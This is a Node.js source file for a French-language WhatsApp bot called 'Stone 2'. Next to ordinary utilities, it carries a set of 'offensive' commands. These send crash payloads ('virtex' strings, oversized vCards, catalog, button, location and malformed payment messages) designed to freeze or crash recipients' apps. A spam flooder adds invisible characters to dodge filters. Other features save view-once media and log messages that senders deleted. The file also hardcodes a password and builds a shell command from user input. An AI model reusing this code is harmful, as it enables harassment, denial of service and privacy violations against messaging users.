const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, DisconnectReason, downloadMediaMessage } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec, execSync } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const { Jimp } = require("jimp");
const readline = require("readline");
const { OpenAI } = require("openai");

// --- CONFIGURATION ---
const groq = new OpenAI({
    apiKey: process.env.GROQ_API_KEY || "gsk_yK6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Y",
    baseURL: "https://api.groq.com/openai/v1",
});

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise(resolve => rl.question(text, resolve));

const SESSIONS_DIR = path.join(__dirname, "sessions");
const TEMP_DIR = path.join(__dirname, "temp");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// --- COLLECTIONS DE TEXTES SPÉCIAUX (VIRTEX) ---
const VIRTEX_PAYLOADS = [
    "\u200e\u200f".repeat(15000), // Caractères de direction RTL/LTR (Surcharge de rendu)
    "\u00ad".repeat(15000), // Soft Hyphen
    "\u200b".repeat(25000), // Zero-width space (Saturation de mémoire)
    "\u061c".repeat(15000), // Arabic Letter Mark
    "జ్ఞా".repeat(5000), // Telugu character (Crash de rendu sur certains OS)
    "0".repeat(100000), // Surcharge de buffer simple
    "🔴".repeat(10000) + "⚫".repeat(10000), // Crash visuel
    "🏳️‍🌈".repeat(5000) + "🏴‍☠️".repeat(5000) // Surcharge d'emojis complexes
];

const ADVANCED_VCARDS = [
    'BEGIN:VCARD\nVERSION:3.0\nFN:' + "☣️".repeat(5000) + '\nORG:' + "🔥".repeat(5000) + ';\nEND:VCARD',
    'BEGIN:VCARD\nVERSION:3.0\nFN:System Error\nTEL;type=CELL;type=VOICE;type=pref:+' + "1".repeat(1000) + '\nEND:VCARD'
];

// --- VARIABLES GLOBALES ---
const activeSessions = new Map();
const hostingStates = new Map(); // Pour suivre les utilisateurs en cours d'hébergement
const messageCache = new Map(); // Cache pour l'anti-suppression et alt-delete
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- FONCTIONS UTILITAIRES ---

const getInvisibleJunk = () => {
    const chars = ["\u200B", "\u200C", "\u200D"];
    let junk = "";
    const length = Math.floor(Math.random() * 5) + 1;
    for (let i = 0; i < length; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    return junk;
};

async function downloadYouTubeMP3(query) {
    return new Promise((resolve, reject) => {
        const filename = `audio_${Date.now()}.mp3`;
        const outputPath = path.join(TEMP_DIR, filename);
        const cmd = `yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "${outputPath}" "ytsearch1:${query}"`;
        
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Échec du téléchargement YouTube: ${stderr || error.message}`));
            } else {
                resolve(outputPath);
            }
        });
    });
}

async function uploadToCatbox(buffer, filename) {
    const tempPath = path.join(TEMP_DIR, `upload_${Date.now()}_${filename}`);
    fs.writeFileSync(tempPath, buffer);
    try {
        const cmd = `curl -F "reqtype=fileupload" -F "fileToUpload=@${tempPath}" https://catbox.moe/user/api.php`;
        const link = execSync(cmd).toString().trim();
        return link;
    } catch (e) {
        console.error("Catbox upload error:", e);
        return null;
    } finally {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    }
}

function logDeletedMessage(phoneNumber, remoteJid, senderName, originalText) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ ⚠️  ALERTE : MESSAGE SUPPRIMÉ PAR L'UTILISATEUR`);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = originalText ? originalText.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Contenu non récupérable]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 🗑️  ANCIEN  : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

function logMessage(phoneNumber, remoteJid, senderName, text, type) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 📱 BOT     : [${phoneNumber}]`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log(`║ 📂 TYPE    : ${type.toUpperCase()}`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = text ? text.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Pas de contenu texte]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 💬 MSG     : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

async function sendMenuAudio(sock, remoteJid, quoted) {
    const audioUrl = "https://files.catbox.moe/azu9je.mp3";
    const tempInput = path.join(TEMP_DIR, `menu_in_${Date.now()}.mp3`);
    const tempOutput = path.join(TEMP_DIR, `menu_out_${Date.now()}.opus`);

    try {
        const response = await axios({ url: audioUrl, method: "GET", responseType: "stream" });
        const writer = fs.createWriteStream(tempInput);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        await new Promise((resolve, reject) => {
            ffmpeg(tempInput)
                .audioCodec("libopus")
                .toFormat("ogg")
                .addOptions(["-ac", "1", "-ar", "48000", "-b:a", "128k", "-map_metadata", "-1"])
                .on("end", resolve)
                .on("error", reject)
                .save(tempOutput);
        });

        await sock.sendMessage(remoteJid, { 
            audio: fs.readFileSync(tempOutput), 
            mimetype: "audio/ogg; codecs=opus", 
            ptt: true 
        }, { quoted });

    } catch (e) {
        console.error("Erreur audio menu:", e);
    } finally {
        if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
        if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
    }
}

async function getGroqResponse(userMessage) {
    try {
        const completion = await groq.chat.completions.create({
            messages: [{ role: "system", content: "Tu es Stone 2, créé par Moussa Kamara." }, { role: "user", content: userMessage }],
            model: "llama-3.1-8b-instant",
        });
        return completion.choices[0]?.message?.content || "Désolé, je bug.";
    } catch (e) { return "IA indisponible."; }
}

// --- FONCTION PRINCIPALE DU BOT ---

async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify = null) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
    const sessionPath = path.join(SESSIONS_DIR, cleanNumber);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const { Browsers } = require("@whiskeysockets/baileys");
    const sock = makeWASocket({
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS('Desktop'),
        syncFullHistory: true,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
    });

    activeSessions.set(cleanNumber, { sock, isBotActive: false, activeSpams: new Set() });

    // Gérer les mises à jour de connexion
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom) ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut : true;
            console.log('connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
            // Reconnexion si ce n'est pas une déconnexion volontaire (loggedOut)
            if (shouldReconnect) {
                createBotInstance(phoneNumber, sockToNotify, jidToNotify);
            }
        } else if (connection === 'open') {
            console.log('opened connection');
            // Vérifier si le bot n'est pas encore enregistré et demander le code d'appairage
            if (!sock.authState.creds.registered) {
                try {
                    const code = await sock.requestPairingCode(cleanNumber);
                    const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
                    console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
                    if (sockToNotify && jidToNotify) {
                        await sockToNotify.sendMessage(jidToNotify, { text: msg });
                    }
                } catch (e) {
                    console.error("Erreur lors de la demande du code :", e);
                }
            }
        }
    });

    sock.ev.on("creds.update", saveCreds)
    // Gestion de la synchronisation de l'historique (messages hors ligne)
    sock.ev.on("messaging-history.set", async ({ messages, chats, contacts, isLatest }) => {
        console.log(`[${cleanNumber}] 📥 Synchronisation de l'historique : ${messages.length} messages reçus.`);
        if (!messageCache.has(cleanNumber)) messageCache.set(cleanNumber, new Map());
        const sessionCache = messageCache.get(cleanNumber);
        
        for (const m of messages) {
            if (m.message && m.key.remoteJid !== "status@broadcast") {
                const text = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
                sessionCache.set(m.key.id, { 
                    text,
                    senderName: m.pushName || "Inconnu", 
                    remoteJid: m.key.remoteJid 
                });
            }
        }
        if (isLatest) {
            console.log(`[${cleanNumber}] ✅ Synchronisation de l'historique terminée.`);
        }
    });

    // Anti-suppression (Log des messages supprimés)
    sock.ev.on("messages.update", async (updates) => {
        for (const update of updates) {
            if (update.update.messageStubType === 2 && update.update.key.fromMe === false) { // MESSAGE_DELETE
                const deletedMessageId = update.update.key.id;
                const remoteJid = update.update.key.remoteJid;
                const sessionCache = messageCache.get(cleanNumber);

                if (sessionCache && sessionCache.has(deletedMessageId)) {
                    const originalMessage = sessionCache.get(deletedMessageId);
                    logDeletedMessage(cleanNumber, originalMessage.remoteJid, originalMessage.senderName, originalMessage.text);
                    sessionCache.delete(deletedMessageId);
                }
            }
        }
    });

    // Gestion des messages entrants
    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type === "notify") {
            for (const msg of messages) {
                if (!msg.message) return;
                if (msg.key.remoteJid === "status@broadcast") return; // Ignorer les statuts
                if (msg.key.fromMe) return; // Ignorer les messages envoyés par le bot lui-même

                const remoteJid = msg.key.remoteJid;
                const senderName = msg.pushName || "Inconnu";
                const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
                const lowerText = text.toLowerCase();
                const isFromMe = msg.key.fromMe;

                logMessage(cleanNumber, remoteJid, senderName, text, "TEXT");

                const current = activeSessions.get(cleanNumber);

                // --- COMMANDES DE CONTRÔLE ---
                if (lowerText === "on") {
                    current.isBotActive = true;
                    await sock.sendMessage(remoteJid, { text: "✅ IA activée." });
                    return;
                }
                if (lowerText === "off") {
                    current.isBotActive = false;
                    await sock.sendMessage(remoteJid, { text: "🛑 IA désactivée." });
                    return;
                }
                if (lowerText === "stop") {
                    if (current.activeSpams.size > 0) {
                        current.activeSpams.forEach(timeoutId => clearTimeout(timeoutId));
                        current.activeSpams.clear();
                        await sock.sendMessage(remoteJid, { text: "✅ Tous les spams ont été arrêtés." });
                    } else {
                        await sock.sendMessage(remoteJid, { text: "❌ Aucun spam en cours." });
                    }
                    return;
                }

                // --- COMMANDES OFFENSIVES (Proprio) ---
                if (lowerText.startsWith("love ")) {
                    const parts = text.slice(5).trim().split(" ");
                    if (parts.length >= 2) {
                        const spamText = parts.slice(0, -2).join(" ");
                        const count = parseInt(parts[parts.length - 2]);
                        const delay = parseInt(parts[parts.length - 1]);

                        if (!isNaN(count) && !isNaN(delay) && count > 0 && delay >= 0) {
                            await sock.sendMessage(remoteJid, { text: `💖 Lancement du spam '${spamText}' ${count} fois avec ${delay}ms de délai.` });
                            let sentCount = 0;
                            const spamInterval = setInterval(async () => {
                                if (sentCount < count) {
                                    await sock.sendMessage(remoteJid, { text: spamText + getInvisibleJunk() });
                                    sentCount++;
                                } else {
                                    clearInterval(spamInterval);
                                    current.activeSpams.delete(spamInterval);
                                    await sock.sendMessage(remoteJid, { text: `✅ Spam '${spamText}' terminé.` });
                                }
                            }, delay);
                            current.activeSpams.add(spamInterval);
                        } else {
                            await sock.sendMessage(remoteJid, { text: "❌ Format : love [texte] [quantité] [délai_ms]" });
                        }
                    } else {
                        await sock.sendMessage(remoteJid, { text: "❌ Format : love [texte] [quantité] [délai_ms]" });
                    }
                    return;
                }

                if (lowerText.startsWith("crash ")) {
                    const index = parseInt(lowerText.slice(6).trim());
                    if (!isNaN(index) && index >= 0 && index < VIRTEX_PAYLOADS.length) {
                        await sock.sendMessage(remoteJid, { text: `☣️ Envoi de Virtex #${index}...` });
                        try {
                            await sock.sendMessage(remoteJid, { text: VIRTEX_PAYLOADS[index] });
                            await sock.sendMessage(remoteJid, { text: "✅ Virtex envoyé." });
                        } catch (e) {
                            console.error("Erreur Virtex:", e);
                            await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi de Virtex." });
                        }
                    } else {
                        await sock.sendMessage(remoteJid, { text: `❌ Index Virtex invalide. Choisissez entre 0 et ${VIRTEX_PAYLOADS.length - 1}.` });
                    }
                    return;
                }

                if (lowerText.startsWith("vcardcrash ")) {
                    const index = parseInt(lowerText.slice(11).trim());
                    if (!isNaN(index) && index >= 0 && index < ADVANCED_VCARDS.length) {
                        await sock.sendMessage(remoteJid, { text: `☣️ Envoi de VCard avancée #${index}...` });
                        try {
                            await sock.sendMessage(remoteJid, { contacts: { displayName: 'Crash Contact', contacts: [{ vcard: ADVANCED_VCARDS[index] }] } });
                            await sock.sendMessage(remoteJid, { text: "✅ VCard avancée envoyée." });
                        } catch (e) {
                            console.error("Erreur VCard avancée:", e);
                            await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi de VCard avancée." });
                        }
                    } else {
                        await sock.sendMessage(remoteJid, { text: `❌ Index VCard avancé invalide. Choisissez entre 0 et ${ADVANCED_VCARDS.length - 1}.` });
                    }
                    return;
                }

                if (lowerText.startsWith("catcrash")) {
                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU CATALOG-CRASH...*" });
                    const payload = "☣️".repeat(10000);
                    await sock.sendMessage(remoteJid, {
                        product: {
                            product: {
                                productImage: { url: "https://files.catbox.moe/6uhomx.png" },
                                productId: "stone2-crash-" + Date.now(),
                                title: payload,
                                description: payload,
                                currencyCode: "USD",
                                priceAmount1000: "999999999",
                                retailerId: "stone2-retailer",
                                url: "https://wa.me/stone2"
                            },
                            businessOwnerJid: sock.user.id
                        }
                    });
                    await sock.sendMessage(remoteJid, { text: "✅ *CATALOG-CRASH ENVOYÉ*" });
                    return;
                }

                // 2. Boutons Malformés (Lag/Crash)
                if (lowerText.startsWith("btncrash")) {
                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU BUTTON-CRASH...*" });
                    const payload = "🔥".repeat(5000);
                    const buttons = [
                        { buttonId: 'id1', buttonText: { displayText: payload }, type: 1 },
                        { buttonId: 'id2', buttonText: { displayText: payload }, type: 1 }
                    ];
                    await sock.sendMessage(remoteJid, {
                        text: "⚠️ System Alert",
                        footer: payload,
                        buttons: buttons,
                        headerType: 1
                    });
                    await sock.sendMessage(remoteJid, { text: "✅ *BUTTON-CRASH ENVOYÉ*" });
                    return;
                }

                // 3. Localisation Fantôme (Map Crash)
                if (lowerText.startsWith("loccrash")) {
                    await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
                    await sock.sendMessage(remoteJid, {
                        location: {
                            degreesLatitude: 99999999,
                            degreesLongitude: 99999999,
                            name: "☣️".repeat(10000),
                            address: "🔥".repeat(10000)
                        }
                    });
                    await sock.sendMessage(remoteJid, { text: "✅ *LOCATION-CRASH ENVOYÉ*" });
                    return;
                }

                // 4. OMEGA-CRASH (Paiement & Flux - Ultra Puissant)
                if (lowerText.startsWith("omega")) {
                    await sock.sendMessage(remoteJid, { text: "💀 *PROTOCOLE OMEGA ACTIVÉ...*" });
                    const heavyPayload = "✨".repeat(15000);
                    
                    try {
                        // Envoi d'un message de paiement malformé
                        await sock.sendMessage(remoteJid, {
                            paymentInvite: {
                                type: 1,
                                expiryTimestamp: Date.now() + 86400000,
                                amount: {
                                    value: 999999999,
                                    offset: 100,
                                    currencyCode: "BRL"
                                },
                                paymentMethod: 1,
                                senderJid: sock.user.id,
                                receiverJid: remoteJid,
                                note: heavyPayload
                            }
                        });

                        // Envoi simultané d'un flux interactif corrompu
                        await sock.sendMessage(remoteJid, {
                            viewOnceMessage: {
                                message: {
                                    interactiveMessage: {
                                        header: { title: "System Critical Error", hasMediaAttachment: false },
                                        body: { text: heavyPayload },
                                        footer: { text: "Omega Protocol" },
                                        nativeFlowMessage: {
                                            buttons: [
                                                {
                                                    name: "single_select",
                                                    buttonParamsJson: JSON.stringify({
                                                        title: "Click to Fix",
                                                        sections: [{
                                                            title: heavyPayload,
                                                            rows: Array(20).fill({ title: "Error", rowId: "err" })
                                                        }]
                                                    })
                                                }
                                            ]
                                        }
                                    }
                                }
                            }
                        });
                        
                        await sock.sendMessage(remoteJid, { text: "✅ *PROTOCOLE OMEGA DÉPLOYÉ*" });
                    } catch (e) {
                        console.error("Erreur Omega:", e);
                        await sock.sendMessage(remoteJid, { text: "❌ Échec du protocole Omega." });
                    }
                    return;
                }

                // Commande Ultra-Crash (65000+ caractères)
                if (lowerText.startsWith("ultra")) {
                    const char = "జ్ఞా";
                    const payload = char.repeat(66000);
                    await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
                    try {
                        await sock.sendMessage(remoteJid, { text: payload });
                        await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
                    } catch (e) {
                        console.error("Erreur Ultra-Crash:", e);
                        await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
                    }
                    return;
                }

                // --- COMMANDES PUBLIQUES / MIXTES ---

                if (lowerText === "menu") {
                    const menu = `*STONE 2 - MENU COMPLET*\n\n` +
                        `*--- CONTRÔLE ---*\n` +
                        `- *on* / *off* : Activer/Désactiver l'IA\n` +
                        `- *menu* : Afficher ce menu\n\n` +
                        `*--- UTILITAIRES ---*\n` +
                        `- *video [nom]* : Télécharger YouTube MP3\n` +
                        `- *s* / *sticker* : Créer un sticker (citer image/vidéo)\n` +
                        `- *save* / *vv* : Sauver un média (vue unique)\n` +
                        `- *host* : Héberger un média sur Catbox\n` +
                        `- *rappel [temps] [texte]* : Rappel (ex: 10m manger)\n- *extract* : Voir les messages synchronisés (hors ligne)\n- *count* : Compter vos messages envoyés à ce contact\n\n` +
                        `*--- ADMINISTRATION ---*\n` +
                        `- *connect [num] [mdp]* : Lancer une session\n` +
                        `- *disconnect [num] [mdp]* : Stopper une session\n` +
                        `- *alt-delete* : Nettoyer ses messages\n` +
                        `- *alt-kick* : Vider le groupe (Admin requis)\n\n` +
                        `*--- OFFENSIF (Proprio) ---*\n` +
                        `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                        `- *crash [nombre]* : Envoi de Virtex\n` +
                        `- *ultra* : Envoi massif de caractères (65k+)\n` +
                        `- *catcrash* : Crash via Catalogue (Freeze)\n` +
                        `- *btncrash* : Crash via Boutons (Lag)\n` +
                        `- *loccrash* : Crash via Localisation (Map)\n` +
                        `- *omega* : PROTOCOLE OMEGA (Paiement & Flux - Ultra)\n` +
                        `- *stop* : Arrêter le spam en cours\n\n` +
                        `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
                    
                    await sock.sendMessage(remoteJid, { image: { url: "https://files.catbox.moe/6uhomx.png" }, caption: menu }, { quoted: msg });
                    await sendMenuAudio(sock, remoteJid, msg);
                    return;
                }

                if (lowerText === "host") {
                    hostingStates.set(remoteJid, true);
                    await sock.sendMessage(remoteJid, { text: "📤 *MODE HÉBERGEMENT ACTIVÉ*\nEnvoyez votre média (image/vidéo/audio)." }, { quoted: msg });
                    return;
                }

                if (lowerText.startsWith("connect ")) {
                    const parts = text.trim().split(/\s+/);
                    if (parts.length >= 3) {
                        const password = parts[parts.length - 1].toLowerCase();
                        const number = parts[1].replace(/[^0-9]/g, "");
                        if (password === "moussa") {
                            await sock.sendMessage(remoteJid, { text: `⏳ Initialisation de la session pour ${number}...` });
                            createBotInstance(number, sock, remoteJid);
                        } else { 
                            await sock.sendMessage(remoteJid, { text: "❌ Mot de passe incorrect." }); 
                        }
                    } else { 
                        await sock.sendMessage(remoteJid, { text: "❌ Format : connect [numéro] [mot_de_passe]" }); 
                    }
                    return;
                }

                if (lowerText.startsWith("disconnect ")) {
                    const parts = text.split(" ");
                    if (parts.length === 3 && parts[2] === "moussa") {
                        const target = parts[1].replace(/[^0-9]/g, "");
                        if (activeSessions.has(target)) {
                            const session = activeSessions.get(target);
                            session.sock.logout();
                            activeSessions.delete(target);
                            await sock.sendMessage(remoteJid, { text: `✅ Session ${target} déconnectée.` });
                        } else { await sock.sendMessage(remoteJid, { text: "❌ Session introuvable." }); }
                    }
                    return;
                }

                // Gestion du mode hébergement
                if (hostingStates.has(remoteJid)) {
                    const type = msg.message.imageMessage ? "image" : (msg.message.videoMessage ? "video" : (msg.message.audioMessage ? "audio" : null));
                    if (type) {
                        hostingStates.delete(remoteJid);
                        await sock.sendMessage(remoteJid, { text: "⏳ Hébergement en cours..." });
                        try {
                            const buffer = await downloadMediaMessage(msg, "buffer", {}, { logger: pino({ level: "silent" }) });
                            const ext = type === "image" ? "png" : (type === "video" ? "mp4" : "mp3");
                            const link = await uploadToCatbox(buffer, `file.${ext}`);
                            await sock.sendMessage(remoteJid, { text: link ? `✅ *LIEN :* ${link}` : "❌ Erreur Catbox." }, { quoted: msg });
                        } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur traitement." }); }
                        return;
                    }
                }

                // Rappel
                if (lowerText.startsWith("rappel ")) {
                    const input = text.slice(7).trim();
                    const match = input.match(/^(\d+)([smhj])\s+(.+)$/i);
                    if (match) {
                        const amount = parseInt(match[1]);
                        const unit = match[2].toLowerCase();
                        const task = match[3];
                        let duration = amount * (unit === "s" ? 1000 : unit === "m" ? 60000 : unit === "h" ? 3600000 : 86400000);
                        await sock.sendMessage(remoteJid, { text: `✅ Rappel dans ${amount}${unit}.` }, { quoted: msg });
                        setTimeout(() => sock.sendMessage(remoteJid, { text: `⏰ *RAPPEL :* ${task}` }), duration);
                    }
                    return;
                }

                // YouTube MP3
                if (lowerText.startsWith("video ")) {
                    const query = text.slice(6).trim();
                    if (query) {
                        await sock.sendMessage(remoteJid, { text: "⏳ Téléchargement..." });
                        try {
                            const downloadedPath = await downloadYouTubeMP3(query);
                            await sock.sendMessage(remoteJid, { audio: fs.readFileSync(downloadedPath), mimetype: "audio/mp4" }, { quoted: msg });
                            fs.unlinkSync(downloadedPath);
                        } catch (e) {
                            console.error("Erreur YouTube:", e);
                            await sock.sendMessage(remoteJid, { text: `❌ Erreur YouTube: ${e.message}` });
                        }
                    }
                    return;
                }

                // Sauvegarde vue unique (save/vv)
                if (lowerText === "save" || lowerText === "vv") {
                    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
                    if (quoted) {
                        let mediaMessage = null;
                        if (quoted.viewOnceMessageV2) mediaMessage = quoted.viewOnceMessageV2.message;
                        else if (quoted.viewOnceMessage) mediaMessage = quoted.viewOnceMessage.message;
                        else if (quoted.imageMessage || quoted.videoMessage) mediaMessage = quoted;

                        if (mediaMessage) {
                            const type = mediaMessage.imageMessage ? "image" : (mediaMessage.videoMessage ? "video" : null);
                            if (type) {
                                try {
                                    const buffer = await downloadMediaMessage({ message: mediaMessage }, "buffer", {}, { logger: pino({ level: "silent" }) });
                                    await sock.sendMessage(remoteJid, { [type]: buffer, caption: "✅ Média sauvé !" }, { quoted: msg });
                                } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sauvegarde." }); }
                            }
                        }
                    }
                    return;
                }

                // Sticker
                if (lowerText === "s" || lowerText === "sticker") {
                    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage || msg.message;
                    const type = quoted.imageMessage ? "image" : (quoted.videoMessage ? "video" : null);
                    if (type) {
                        try {
                            const buffer = await downloadMediaMessage({ message: quoted }, "buffer", {}, { logger: pino({ level: "silent" }) });
                            const tempImg = path.join(TEMP_DIR, `sticker_${Date.now()}.webp`);
                            if (type === "image") {
                                const image = await Jimp.read(buffer);
                                await image.contain({ w: 512, h: 512 }).write(tempImg);
                            } else {
                                const tempVid = path.join(TEMP_DIR, `vid_${Date.now()}.mp4`);
                                fs.writeFileSync(tempVid, buffer);
                                await new Promise((resolve, reject) => {
                                    ffmpeg(tempVid).inputOptions(["-t", "10"]).complexFilter(["scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000"]).outputOptions(["-vcodec", "libwebp", "-lossless", "1", "-loop", "0", "-preset", "default", "-an", "-vsync", "0"]).on("end", resolve).on("error", reject).save(tempImg);
                                });
                                fs.unlinkSync(tempVid);
                            }
                            await sock.sendMessage(remoteJid, { sticker: fs.readFileSync(tempImg) }, { quoted: msg });
                            fs.unlinkSync(tempImg);
                        } catch (e) { await sock.sendMessage(remoteJid, { text: "❌ Erreur sticker." }); }
                    }
                    return;
                }

                // IA Groq (si activée et pas une commande)
                if (current.isBotActive && !isFromMe && text && !["menu", "save", "vv", "s", "sticker", "host", "on", "off", "stop"].includes(lowerText) && !lowerText.startsWith("connect ") && !lowerText.startsWith("video ") && !lowerText.startsWith("rappel ")) {
                    const res = await getGroqResponse(text);
                    await sock.sendMessage(remoteJid, { text: res });
                }
            }
        }
    });
}

async function start() {
    console.log("--- DÉMARRAGE STONE 2 (VERSION FUSIONNÉE) ---");
    // Remplacez le numéro ci-dessous par votre numéro principal
    const mainNum = "16062620863"; 
    console.log(`Démarrage automatique pour le numéro : ${mainNum}`);
    createBotInstance(mainNum.replace(/[^0-9]/g, ""));
}

start();
